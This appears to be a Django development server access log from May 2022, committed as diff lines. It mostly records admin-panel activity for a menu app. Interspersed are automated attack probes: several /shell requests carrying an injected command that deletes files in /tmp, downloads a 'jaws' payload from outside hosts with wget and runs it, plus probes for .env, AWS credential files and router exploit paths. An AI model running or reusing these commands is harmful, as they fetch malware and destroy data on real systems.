+[11/May/2022 23:45:47] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[11/May/2022 23:45:47] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[11/May/2022 23:45:47] "GET /favicon.ico HTTP/1.1" 404 2228
+[11/May/2022 23:45:47] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[11/May/2022 23:45:49] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 23:45:49] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[11/May/2022 23:45:49] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[11/May/2022 23:45:49] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[11/May/2022 23:45:49] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[11/May/2022 23:45:49] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[11/May/2022 23:45:49] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[11/May/2022 23:46:39] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[11/May/2022 23:46:39] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9740
+[11/May/2022 23:46:39] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[11/May/2022 23:46:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 23:46:39] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[11/May/2022 23:46:39] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[11/May/2022 23:46:39] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[11/May/2022 23:46:39] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[11/May/2022 23:46:39] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[11/May/2022 23:46:39] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[11/May/2022 23:46:39] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[11/May/2022 23:46:40] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[11/May/2022 23:47:15] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[11/May/2022 23:47:15] "GET /admin/menu/menu/ HTTP/1.1" 200 40836
+[11/May/2022 23:47:15] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[11/May/2022 23:47:15] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 23:47:15] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[11/May/2022 23:47:32,253] - Broken pipe from ('210.104.204.16', 56533)
+
+[11/May/2022 23:47:32,253] - Broken pipe from ('210.104.204.16', 56535)
+
+[11/May/2022 23:47:32,253] - Broken pipe from ('210.104.204.16', 56536)
+
+[11/May/2022 23:47:32,254] - Broken pipe from ('210.104.204.16', 56538)
+
+[11/May/2022 23:47:32,254] - Broken pipe from ('210.104.204.16', 56495)
+
+[11/May/2022 23:47:32,255] - Broken pipe from ('210.104.204.16', 56537)
+
+Not Found: /ab2g
+[12/May/2022 00:00:19] "GET /ab2g HTTP/1.1" 404 2218
+Not Found: /ab2h
+[12/May/2022 00:00:29] "GET /ab2h HTTP/1.1" 404 2218
+Not Found: /shell
+[12/May/2022 00:11:08] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+[12/May/2022 00:11:08,693] - Broken pipe from ('41.239.249.60', 49870)
+
+Not Found: /
+[12/May/2022 00:48:10] "GET / HTTP/1.1" 404 2177
+Not Found: /robots.txt
+[12/May/2022 00:48:11] "GET /robots.txt HTTP/1.1" 404 2225
+Not Found: /sitemap.xml
+[12/May/2022 00:48:12] "GET /sitemap.xml HTTP/1.1" 404 2228
+Not Found: /.well-known/security.txt
+[12/May/2022 00:48:12] "GET /.well-known/security.txt HTTP/1.1" 404 2267
+[12/May/2022 00:48:15,421] - Broken pipe from ('185.142.236.41', 40482)
+
+[12/May/2022 00:48:16,044] - Broken pipe from ('185.142.236.41', 41964)
+
+Not Found: /favicon.ico
+[12/May/2022 00:48:16] "GET /favicon.ico HTTP/1.1" 404 2228
+[12/May/2022 00:48:16,566] - Broken pipe from ('185.142.236.41', 41118)
+
+[12/May/2022 00:48:25] code 400, message Bad request syntax ('\x03QY|b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+[12/May/2022 00:48:25] "QY|b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            " 400 -
+Not Found: ///.env
+[12/May/2022 01:21:07] "GET ///.env HTTP/1.1" 404 2213
+[12/May/2022 01:38:36] "POST /menu/ HTTP/1.1" 200 299
+[12/May/2022 01:39:37] code 400, message Bad request syntax ('MGLNDD_118.67.132.87_80')
+[12/May/2022 01:39:37] "MGLNDD_118.67.132.87_80" 400 -
+[12/May/2022 01:49:13] "POST /menu/ HTTP/1.1" 200 299
+[12/May/2022 02:11:41] "POST /menu/ HTTP/1.1" 200 299
+[12/May/2022 02:28:52] "POST /menu/ HTTP/1.1" 200 235
+[12/May/2022 02:33:39] "POST /menu/ HTTP/1.1" 200 299
+Not Found: /
+[12/May/2022 02:43:22] "GET / HTTP/1.1" 404 2188
+[12/May/2022 02:43:22,643] - Broken pipe from ('179.189.97.247', 34616)
+
+Not Found: /shell
+[12/May/2022 03:06:56] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+Not Found: /shell
+[12/May/2022 03:06:57] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+[12/May/2022 03:12:21] "POST /menu/ HTTP/1.1" 200 203
+[12/May/2022 03:12:46] "POST /menu/ HTTP/1.1" 200 28
+[12/May/2022 03:30:58] "GET /admin/ HTTP/1.1" 200 6879
+[12/May/2022 03:30:58] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[12/May/2022 03:30:58] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[12/May/2022 03:30:58] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[12/May/2022 03:30:58] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[12/May/2022 03:30:58] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[12/May/2022 03:30:58] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[12/May/2022 03:31:01,548] - Broken pipe from ('210.104.204.16', 57050)
+
+[12/May/2022 03:31:01] "GET /admin/menu/menu/ HTTP/1.1" 200 40633
+[12/May/2022 03:31:01] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[12/May/2022 03:31:01] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[12/May/2022 03:31:01] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[12/May/2022 03:31:01] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[12/May/2022 03:31:01] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[12/May/2022 03:31:01] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[12/May/2022 03:31:02] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[12/May/2022 03:31:04] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[12/May/2022 03:31:05] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+Not Found: /favicon.ico
+[12/May/2022 03:31:11] "GET /favicon.ico HTTP/1.1" 404 2228
+[12/May/2022 03:31:11] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[12/May/2022 03:31:44] "POST /menu/ HTTP/1.1" 200 299
+[12/May/2022 03:32:17,509] - Broken pipe from ('210.104.204.16', 57052)
+
+[12/May/2022 03:32:17,510] - Broken pipe from ('210.104.204.16', 57045)
+
+[12/May/2022 03:32:17,510] - Broken pipe from ('210.104.204.16', 57051)
+
+[12/May/2022 03:32:17,510] - Broken pipe from ('210.104.204.16', 57046)
+
+[12/May/2022 03:32:17,510] - Broken pipe from ('210.104.204.16', 57054)
+
+[12/May/2022 04:43:59] "POST /menu/ HTTP/1.1" 200 267
+[12/May/2022 04:44:02] "POST /menu/ HTTP/1.1" 200 177
+[12/May/2022 04:44:12] "POST /menu/ HTTP/1.1" 200 177
+Not Found: /.env
+[12/May/2022 05:02:53] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[12/May/2022 05:02:54] "POST / HTTP/1.1" 404 2178
+Not Found: /GponForm/diag_Form
+[12/May/2022 05:10:39] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2257
+[12/May/2022 05:10:39,391] - Broken pipe from ('220.198.204.127', 7584)
+
+[12/May/2022 05:17:55] "POST /menu/ HTTP/1.1" 200 225
+[12/May/2022 05:18:03] "POST /menu/ HTTP/1.1" 200 203
+[12/May/2022 05:35:00] "POST /menu/ HTTP/1.1" 200 225
+[12/May/2022 05:35:16] "POST /menu/ HTTP/1.1" 200 289
+Not Found: /
+[12/May/2022 06:23:56] "GET / HTTP/1.0" 404 2188
+Not Found: /.env
+[12/May/2022 06:59:57] "GET /.env HTTP/1.1" 404 2207
+[12/May/2022 06:59:57] code 400, message Bad request version ('èf/\x02¢\x82äª¥rèaÚYù\x98fEéëúC\x8bgÁf\x12Óï»Â\\\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[12/May/2022 06:59:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[12/May/2022 07:00:51] "POST /menu/ HTTP/1.1" 200 28
+[12/May/2022 07:01:51] "POST /menu/ HTTP/1.1" 200 299
+Not Found: /
+[12/May/2022 07:07:13] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[12/May/2022 07:09:09] "GET / HTTP/1.1" 404 2177
+[12/May/2022 07:22:28] "POST /menu/ HTTP/1.1" 200 203
+Not Found: /
+[12/May/2022 07:42:49] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[12/May/2022 07:50:55] "GET / HTTP/1.1" 404 2180
+[12/May/2022 08:08:50] "POST /menu/ HTTP/1.1" 200 197
+Not Found: /shell
+[12/May/2022 09:16:05] "GET /shell?cd+/tmp;rm+-rf+*;wget+v1.kannimanelaji.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2270
+Not Found: /.env
+[12/May/2022 09:24:14] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[12/May/2022 09:24:15] "POST / HTTP/1.1" 404 2178
+[12/May/2022 09:45:25,293] - Broken pipe from ('20.239.173.152', 57063)
+
+Not Found: /robots.txt
+[12/May/2022 09:45:25] "HEAD /robots.txt HTTP/1.0" 404 2237
+Not Found: /
+[12/May/2022 10:00:28] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[12/May/2022 11:22:20] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[12/May/2022 11:22:26] "GET / HTTP/1.1" 404 2177
+[12/May/2022 11:42:29] "POST /menu/ HTTP/1.1" 200 197
+[12/May/2022 11:42:49] "POST /menu/ HTTP/1.1" 200 167
+[12/May/2022 11:42:54] "POST /menu/ HTTP/1.1" 200 195
+Not Found: /
+[12/May/2022 11:45:41] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[12/May/2022 12:29:41] "GET / HTTP/1.0" 404 2180
+Not Found: /.aws/credentials
+[12/May/2022 12:35:48] "GET /.aws/credentials HTTP/1.1" 404 2243
+[12/May/2022 12:35:48] code 400, message Bad request syntax ('\x16\x03\x01\x01D\x01\x00\x01@\x03\x03Kþ')
+[12/May/2022 12:35:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[12/May/2022 12:46:43] code 400, message Bad request version ('À\x14À')
+[12/May/2022 12:46:43] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[12/May/2022 12:46:55] "GET / HTTP/1.1" 404 2177
+Not Found: /favicon.ico
+[12/May/2022 12:47:17] "GET /favicon.ico HTTP/1.1" 404 2228
+Not Found: /robots.txt
+[12/May/2022 12:47:19] "GET /robots.txt HTTP/1.1" 404 2225
+Not Found: /sitemap.xml
+[12/May/2022 12:47:21] "GET /sitemap.xml HTTP/1.1" 404 2228
+[12/May/2022 12:47:40,882] - Broken pipe from ('23.224.186.137', 41976)
+
+Not Found: /
+[12/May/2022 13:57:31] "GET / HTTP/1.1" 404 2180
+Not Found: /.env
+[12/May/2022 15:09:15] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[12/May/2022 15:09:16] "POST / HTTP/1.1" 404 2178
+Not Found: /
+[12/May/2022 15:32:11] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[12/May/2022 15:53:50] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[12/May/2022 16:02:28] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[12/May/2022 17:27:02] "GET / HTTP/1.1" 404 2177
+[12/May/2022 17:27:03] code 505, message Invalid HTTP version (2.0)
+[12/May/2022 17:27:03] "PRI * HTTP/2.0" 505 -
+Not Found: /
+[12/May/2022 18:25:54] "GET / HTTP/1.1" 404 2177
+[12/May/2022 19:18:31,373] - Broken pipe from ('167.248.133.118', 36030)
+
+Not Found: /
+[12/May/2022 19:18:32] "GET / HTTP/1.1" 404 2180
+[12/May/2022 19:18:32,723] - Broken pipe from ('167.248.133.118', 47556)
+
+Not Found: /
+[12/May/2022 19:18:32] "GET / HTTP/1.1" 404 2177
+[12/May/2022 19:18:33] code 505, message Invalid HTTP version (2.0)
+[12/May/2022 19:18:33] "PRI * HTTP/2.0" 505 -
+Not Found: /boaform/admin/formLogin
+[12/May/2022 19:44:31] "POST /boaform/admin/formLogin HTTP/1.1" 404 2268
+Not Found: /
+[12/May/2022 19:53:29] "GET / HTTP/1.1" 404 2177
+[12/May/2022 20:09:34,554] - Broken pipe from ('162.142.125.213', 35680)
+
+Not Found: /
+[12/May/2022 20:09:35] "GET / HTTP/1.1" 404 2180
+[12/May/2022 20:09:36,059] - Broken pipe from ('162.142.125.213', 53192)
+
+Not Found: /
+[12/May/2022 20:09:36] "GET / HTTP/1.1" 404 2177
+[12/May/2022 20:09:36] code 505, message Invalid HTTP version (2.0)
+[12/May/2022 20:09:36] "PRI * HTTP/2.0" 505 -
+Not Found: /
+[12/May/2022 21:06:25] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[12/May/2022 21:17:15] "GET / HTTP/1.0" 404 2188
+[12/May/2022 23:41:03,779] - Broken pipe from ('167.94.138.120', 34666)
+
+Not Found: /
+[12/May/2022 23:41:04] "GET / HTTP/1.1" 404 2180
+[12/May/2022 23:41:05,142] - Broken pipe from ('167.94.138.120', 32962)
+
+Not Found: /
+[12/May/2022 23:41:05] "GET / HTTP/1.1" 404 2177
+[12/May/2022 23:41:05] code 505, message Invalid HTTP version (2.0)
+[12/May/2022 23:41:05] "PRI * HTTP/2.0" 505 -
+[12/May/2022 23:41:42] "GET /admin/ HTTP/1.1" 200 6879
+[12/May/2022 23:41:43] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[12/May/2022 23:41:43] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[12/May/2022 23:41:43] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[12/May/2022 23:41:43] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[12/May/2022 23:41:43] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[12/May/2022 23:41:43] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[12/May/2022 23:41:43] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[12/May/2022 23:41:43] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[12/May/2022 23:41:43] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[12/May/2022 23:41:43] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[12/May/2022 23:41:43] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+Not Found: /favicon.ico
+[12/May/2022 23:41:44] "GET /favicon.ico HTTP/1.1" 404 2228
+[12/May/2022 23:41:45] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[12/May/2022 23:41:45] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[12/May/2022 23:41:45] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[12/May/2022 23:41:45] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[12/May/2022 23:41:45] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[12/May/2022 23:41:45] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[12/May/2022 23:41:45] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[12/May/2022 23:41:45] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[12/May/2022 23:41:45] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[12/May/2022 23:41:45] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[12/May/2022 23:41:45] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[12/May/2022 23:41:45] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[12/May/2022 23:41:45] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[12/May/2022 23:41:45] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[12/May/2022 23:41:45] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[12/May/2022 23:41:45] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+Not Found: /favicon.ico
+[12/May/2022 23:41:46] "GET /favicon.ico HTTP/1.1" 404 2228
+[12/May/2022 23:42:42] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[12/May/2022 23:42:42] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9740
+[12/May/2022 23:42:42] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[12/May/2022 23:43:28] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[12/May/2022 23:43:28] "GET /admin/menu/menu/ HTTP/1.1" 200 42003
+[12/May/2022 23:43:28] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6932
+[12/May/2022 23:43:28] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[12/May/2022 23:43:28] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[12/May/2022 23:43:39,383] - Broken pipe from ('210.104.204.16', 60763)
+
+[12/May/2022 23:43:39,383] - Broken pipe from ('210.104.204.16', 60765)
+
+[12/May/2022 23:43:39,383] - Broken pipe from ('210.104.204.16', 60764)
+
+[12/May/2022 23:43:39,384] - Broken pipe from ('210.104.204.16', 60762)
+
+[12/May/2022 23:43:39,383] - Broken pipe from ('210.104.204.16', 60745)
+
+[12/May/2022 23:43:39,384] - Broken pipe from ('210.104.204.16', 60761)
+
+Not Found: /
+[12/May/2022 23:56:05] "GET / HTTP/1.1" 404 2180
+[13/May/2022 00:00:56] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ý\x01\x00\x00Ù\x03\x03Xc\x16º\x94\x80&<³')
